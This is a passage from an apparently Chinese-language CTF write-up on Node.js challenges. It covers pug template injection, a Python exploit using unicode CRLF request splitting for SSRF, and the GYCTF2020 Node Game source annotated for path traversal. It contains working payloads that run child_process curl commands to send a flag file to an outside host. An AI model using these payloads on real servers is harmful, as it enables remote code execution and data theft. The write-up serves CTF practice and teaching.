&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcode&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;\143\157\156\163\164\162\165\143\164\157\162&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid,executable
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">156&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">163&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">165&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// invalid,since &amp;#34; is encoded
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>pug模板两种形式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">shellcode&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#75af00">shellcode&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>写一个外带flag的payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl 172.19.0.1:8888 -X POST -d @flag.txt&amp;#39;))&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我根据这位大佬的py2版&lt;a href="https://ctftime.org/writeup/18293">exp.py&lt;/a>写了一个py3版本的，并且改的简洁了一些（有了一些通用性，但是由于还是部分unicode编码，总体上不如全编码的稳&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># 仅对字母进行编码&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;o&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">_pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;-[][&amp;#34;constructor][&amp;#34;constructor](&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl http://ip:port/ -d @/flag.txt&amp;#39;))&amp;#34;)()&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_pug&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;%22&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;%27&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(pug)&lt;/span>
&lt;span style="color:#75715e"># print(quote(pug))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">x-forwarded-for: 127.0.0.1
&lt;/span>&lt;span style="color:#d88200">adminauth: secretpassword
&lt;/span>&lt;span style="color:#d88200">pug: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pug&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">test: &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地复现成功&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206192539624.png" alt="image-20211206192539624">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206191832996.png" alt="image-20211206191832996">&lt;/p>
&lt;h2 id="gyctf2020node-game">[GYCTF2020]Node Game&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">morgan&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;morgan&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">multer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;multer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">multer&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;./dist&amp;#39;&lt;/span>&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">morgan&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;short&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// 简化版日志
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/template&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// action参数
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// 不能有/ \
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Errrrr, You have been Blocked&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;.pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">renderFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 模板渲染
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/file_upload&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 需要SSRF
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;only admin&amp;#39;s ip can use it&amp;#34;&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">mimetype&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 路径确定 mimetype可控 路径穿越
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">originalname&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">dir_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
